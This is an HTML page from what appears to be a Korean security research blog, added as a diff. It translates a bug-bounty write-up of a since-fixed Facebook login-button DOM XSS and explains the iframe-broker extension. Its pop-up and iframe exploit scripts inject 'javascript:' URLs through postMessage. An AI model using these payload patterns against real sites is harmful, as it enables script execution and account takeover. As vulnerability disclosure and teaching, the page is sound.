@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>iframe broker &amp; Story of Facebook DOM XSS | Core-Research-Team</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="iframe broker &amp; Story of Facebook DOM XSS" />
+<meta name="author" content="jeong.su" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="라온화이트햇 핵심연구팀 최정수(jeon95u@gmail.com)" />
+<meta property="og:description" content="라온화이트햇 핵심연구팀 최정수(jeon95u@gmail.com)" />
+<link rel="canonical" href="http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS" />
+<meta property="og:url" content="http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS" />
+<meta property="og:site_name" content="Core-Research-Team" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-01T00:00:00+00:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","author":{"@type":"Person","name":"jeong.su"},"url":"http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS","headline":"iframe broker &amp; Story of Facebook DOM XSS","dateModified":"2020-05-01T00:00:00+00:00","datePublished":"2020-05-01T00:00:00+00:00","description":"라온화이트햇 핵심연구팀 최정수(jeon95u@gmail.com)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />
+
+  <!-- Google Analytics-->
+  
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">RAON - Core Research Team</h2>
+    </a>
+    <ul>
+      <li><a href="/about">About</a></li>
+      <li><a href="/">Posts</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post"> 
+	<h1 class="post-title">iframe broker & Story of Facebook DOM XSS</h1>
+	<div class="post-line"></div>
+
+	
+		
+			
+				<span class="tag"><center><i>Web</i></center></span>
+			
+		
+	
+
+	<p>라온화이트햇 핵심연구팀 최정수(<a href="mailto:jeon95u@gmail.com">jeon95u@gmail.com</a>)</p>
+
+<p>이 글은 <a href="https://vinothkumar.me/">Vinoth Kumar</a>가 지난 4월 Facebook의 DOM XSS를 발견하여 제보하고 2만 달러의 포상금을 받은 <a href="https://vinothkumar.me/20000-facebook-dom-xss/">게시글</a>을 번역한 내용이 포함되어 있습니다. 추가로 해당 취약점을 찾기 위해 <a href="https://vinothkumar.me/">Vinoth Kumar</a>가 개발한 Iframe과 Cross Window communications 로그를 쉽게 확인 할 수 있는 크롬 익스텐션을 사용하고 어떻게 적용할 수 있을지 고민했습니다.</p>
+
+<hr />
+
+<h1 id="iframe-broker">iframe broker</h1>
+
+<hr />
+
+<p>iframe broker는  <a href="https://vinothkumar.me/">Vinoth Kumar</a>가 Cross Window Communication 로그를 쉽게 확인하기 위해서 작성한 Chrome Extension 입니다.</p>
+
+<p>해당 도구의 간단한 원리는 message를 후킹하여 보여주는 방식입니다</p>
+
+<p>Javascript는 아래와 같이 간단한 스크립트로 후킹할 수 있습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">origin_parse</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">;</span>
+
+<span class="nb">window</span><span class="p">.</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">arg</span><span class="p">){</span>
+<span class="cm">/* Something Do It! */</span>
+<span class="cm">/* ex) console.log(arg) */</span>
+<span class="k">return</span> <span class="nx">origin_parse</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>iframe broker의 사용법은 아래와 같습니다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/vinothsparrow/iframe-broker
+</code></pre></div></div>
+
+<p>우선 git clone 명령어를 통해 특정 폴더에 iframe-broker를 받아줍니다.</p>
+
+<p><img src="/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png" alt="/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png" /></p>
+
+<p>Chrome Extension 추가를 위해 개발자 모드 옵션을 활성화 시켜줍니다. 해당 옵션을 활성화 시켜주게되면 <code class="highlighter-rouge">압축해제된 확장 프로그램을 로드합니다.</code> 버튼이 생기며 클릭을 통해 clone 해준 iframe-broker 폴더를 선택해줍니다.</p>
+
+<p><img src="/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png" alt="/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png" /></p>
+
+<p>Iframe Broker가 정상적으로 로드된 것을 확인 할 수 있습니다.</p>
+
+<p><img src="/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png" alt="/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png" /></p>
+
+<p>위와 같이 Chrome Extension을 통해 Domain간 통신하는 메세지를 쉽게 확인 할 수 있으며 클라이언트 사이드의 취약점을 찾는데 편리한 도구라는 생각이듭니다. 아래는 해당 Chrome Extension 개발자가 개발 후 Extension을 사용하면서 직접 취약점을 찾은 내용을 번역했습니다.</p>
+
+<h1 id="story-of-20000-facebook-dom-xss">Story of <a href="https://vinothkumar.me/20000-facebook-dom-xss/">$20000 Facebook DOM XSS</a></h1>
+
+<hr />
+
+<blockquote>
+  <p>window.postMessage() method를 사용하면 생성 된 페이지와 팝업 사이 또는 페이지와 페이지에 포함된 iframe 사이와 같은 Window 객체 간의 cross-origin 통신을 안전하게 할 수 있습니다. - <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">Mozilla postMessage Documentation</a></p>
+</blockquote>
+
+<p>postMessage 및 도메인 간 통신에 대해 더 알고 싶다면 아래 문서를 읽는 것이 좋습니다.</p>
+
+<ul>
+  <li><a href="https://javascript.info/cross-window-communication">How cross window/frame communication happens in Javascript</a></li>
+  <li><a href="https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/">https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/</a></li>
+  <li><a href="https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/">https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/</a></li>
+</ul>
+
+<h2 id="background">Background</h2>
+
+<blockquote>
+  <p>postMessage를 통한 DOM XSS는 과소 평가 된 취약점이며 많은 버그바운티 헌터들에게는 눈에 띄지 않는 취약점입니다.</p>
+</blockquote>
+
+<p>최근에 open dashboards 및 credentials 취약점을 찾는 대신 클라이언트 쪽 취약점을 찾기 시작했습니다.</p>
+
+<p>(<a href="https://hackerone.com/vinothkumar">HackerOne에 리포트된 보고서</a>를 본다면 대부분 나의 리포트는 open dashboard 또는 Github credential leak 입니다.)</p>
+
+<p>처음에는 XSSI, JSONP 및 postMessage 관련 된 보안 문제를 찾기 시작했습니다. 그러나 XSSI 및 JSONP 취약점은 매우 드물며 <a href="https://blog.reconless.com/samesite-by-default/">SameSite 쿠키</a>가 도입 된 이후 이 취약점은 사라질 것입니다. 따라서 postMessage 취약점을 살펴 보는 데 집중했습니다. postMessage 취약점은 주로 보안 연구원이 대부분 무시하지만 디버깅이 쉽고 방화벽을 우회 할 필요가 없습니다.</p>
+
+<p>또한 디버깅을 더 쉽게하기 위해 페이지에서 발생하는 cross window communication의 view/log를 위한 <a href="https://github.com/vinothsparrow/iframe-broker">Chrome extension을 개발</a> 했습니다.</p>
+
+<p>일반적으로 웹 사이트는 위젯, 플러그인 또는 웹 SDK에서 iframe 통신을 사용합니다. 따라서 페이스북의 iframe 보안 문제를 찾으려고 시작하자마자 <a href="https://developers.facebook.com/">https://developers.facebook.com</a>으로 이동하여 Facebook의 third-party 플러그인을 보기 시작했습니다.</p>
+
+<p>그리고 cross-domain 통신을 위해서 <code class="highlighter-rouge">Facebook Login SDK for JavaScript</code>는 <code class="highlighter-rouge">v6.0/plugins/login_button.php</code>에서 proxy iframe을 만들며 proxy frame에서는 <code class="highlighter-rouge">Continue with Facebook</code> 버튼을 렌더링 해줍니다. 여기서 흥미로운 점은 javascript SDK가 proxy frame에 버튼의 클릭 URL이 포함 된 초기화 페이로드를 전송 한다는 것입니다.</p>
+
+<p>로그인 SDK의 흐름은 아래와 같습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Third</span><span class="o">-</span><span class="nx">Party</span> <span class="nx">website</span> <span class="o">+</span> <span class="p">(</span><span class="nx">Facebook</span> <span class="nx">Login</span> <span class="nx">SDK</span> <span class="k">for</span> <span class="nx">JavaScript</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>↓</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;sdk=joey</span><span class="dl">'</span><span class="o">&gt;</span>
+<span class="p">&lt;</span><span class="err">/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>↓</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Facebook Javascript SDK는 초기화 payload를 iframe proxy에게 보냅니다.</span>
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">INT_ID</span><span class="dl">'</span><span class="p">,</span>
+<span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&amp;SOME_OTHER_PARAMS</span><span class="dl">'</span><span class="p">,</span>
+<span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">APP_DOMAIN</span><span class="dl">"</span><span class="p">},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>↓</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 유저가 Login with Facebook 버튼을 클릭하면 proxy iframe에서 특정 URL을 open 합니다.</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID</span><span class="dl">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>↓</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 팝업 윈도우는 accesstoken과 signed-request를 third-party website에게 postMessage를 사용하여 보냅니다.</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">origin</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>해당 초기화 payload를 주의 깊게 살펴보면 SDK가 Facebook 플러그인 iframe으로 전송합니다. url 파라미터는 i라는 변수에 저장 되며 버튼이 클릭 되어 이벤트가 트리거 될 때 아래 함수가 실행됩니다.</p>
+
+<p><img src="/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png" alt="/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png" /></p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">i</span><span class="p">.</span><span class="nx">url</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/cbt=</span><span class="se">\d</span><span class="sr">+/</span><span class="p">,</span> <span class="dl">"</span><span class="s2">cbt=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span><span class="p">);</span>
+<span class="nx">a</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">buildPopupFeatureString</span><span class="dl">"</span><span class="p">)(</span><span class="nx">i</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>위 Javascript 코드를 보았을 때 나는 “무언가 왔구나! 취약점이 내게 왔구나! 😉”를 느꼈습니다.</p>
+
+<p>왜냐하면 Javascript 코드에는 URL/Scheme 유효성 검사가 존재하지 않았습니다. 따라서 아래와 같이 DOM XSS를 할 수 있었습니다.</p>
+
+<p><code class="highlighter-rouge">window.open('javascript:alert(document.domain)')</code></p>
+
+<p>그래서 우리가 <code class="highlighter-rouge">url:'javascript:alert(document.domain)'</code>와 같은 페이로드를 보내는 경우 받는 사람은 iframe이 <a href="https://www.facebook.com/v6.0/plugins/login_button.php"><code class="highlighter-rouge">https://www.facebook.com/v6.0/plugins/login_button.php</code></a>를 방문하고 사용자가 <code class="highlighter-rouge">Continue With Facebook</code>버튼을 클릭하게 되면  <a href="http://facebook.com/">facebook.com</a> 도메인에서 <code class="highlighter-rouge">javascript:alert(document.domain)</code>와 같은 Javascript가 실행됩니다.</p>
+
+<h2 id="exploiting-the-iframe">Exploiting the Iframe</h2>
+
+<p>위 보안 이슈를 통해 익스플로잇 하는 방법은 2가지가 있습니다.</p>
+
+<h3 id="1-pop-up-method">1. Pop-up Method</h3>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>   
+   <span class="kd">var</span> <span class="nx">opener</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">opener</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1</span><span class="dl">"</span><span class="p">);</span>
+   
+   <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">123</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">javascript:alert(document.domain);</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">ORIGIN</span><span class="dl">"</span><span class="p">};</span>
+        <span class="nx">opener</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">},</span><span class="dl">'</span><span class="s1">4000</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">&lt;</span><span class="err">/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="2-iframe-method">2. Iframe Method</h3>
+
+<p><code class="highlighter-rouge">X-Frame-Options</code> 또는 CSP <code class="highlighter-rouge">frame-ancestors</code> 헤더가 누락 되었으므로 이 페이지는 공격자의 페이지에 쉽게 포함될 수 있습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">function</span> <span class="nx">fbFrameLoaded</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">iframeEl</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">fbframe</span><span class="dl">'</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">123</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">javascript:alert(document.domain);</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">ORIGIN</span><span class="dl">"</span><span class="p">};</span>
+  <span class="nx">iframeEl</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">};</span>
+<span class="p">&lt;</span><span class="err">/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">id=</span><span class="s2">"fbframe"</span> <span class="na">src=</span><span class="s2">"https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true"</span> <span class="na">onload=</span><span class="s2">"fbFrameLoaded(this)"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="fix">Fix</h2>
+
+<p>Facebook은 <code class="highlighter-rouge">url</code> 파라미터에 정규식 검사를 추가하여 domain과 schema가 존재하는지 확인하는 방법으로 패치했습니다.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">d</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">isFacebookURI</span><span class="dl">"</span><span class="p">)(</span><span class="k">new</span> <span class="p">(</span><span class="nx">g</span> <span class="o">||</span> <span class="p">(</span><span class="nx">g</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">URI</span><span class="dl">"</span><span class="p">)))(</span><span class="nx">c</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">url</span><span class="p">)),</span>
+<span class="nx">j</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">call</span><span class="p">;</span>
+<span class="nx">d</span> <span class="o">||</span> <span class="p">(</span><span class="nx">j</span><span class="p">.</span><span class="nx">url</span> <span class="o">=</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">XOAuthErrorController</span><span class="dl">"</span><span class="p">).</span><span class="nx">getURIBuilder</span><span class="p">().</span><span class="nx">setEnum</span><span class="p">(</span><span class="dl">"</span><span class="s2">error_code</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">PLATFORM__INVALID_URL</span><span class="dl">"</span><span class="p">).</span><span class="nx">getURI</span><span class="p">().</span><span class="nx">toString</span><span class="p">())</span>
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p><a href="https://youtu.be/KAnuFy2F7QA">https://youtu.be/KAnuFy2F7QA</a></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>잘못된 post message 설정 때문에 누군가는 공격자의 웹세이트에 접속하고 페이스북으로 로그인하기 버튼을 클</p>
+
+<p>릭함으로써 <a href="http://facebook.com">facebook.com</a> 도메인에 XSS가 발생하고 <strong>한 번의 클릭 만으로 계정을 탈취</strong> 할 수 있습니다.</p>
+
+	</div>
+</div>
+
+
+  <!-- Start disqus 
+<script src="/assets/js/disqusLoader.js" /></script>
+<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
+<div class="disqus"></div>
+<script>
+    disqusLoader('.disqus', {
+        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+End disqus -->
+
+
+<div class="pagination">
+  
+	<a href="/2020-05-01/memory" class="left arrow">&#8592;</a>
+  
+  
+	<a href="/2020-05-01/Lua" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <!--footer>
+  <span>
+    &copy; <time datetime="2020-07-14 07:51:51 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span>
+</footer-->
+
+  </body>
+</html>
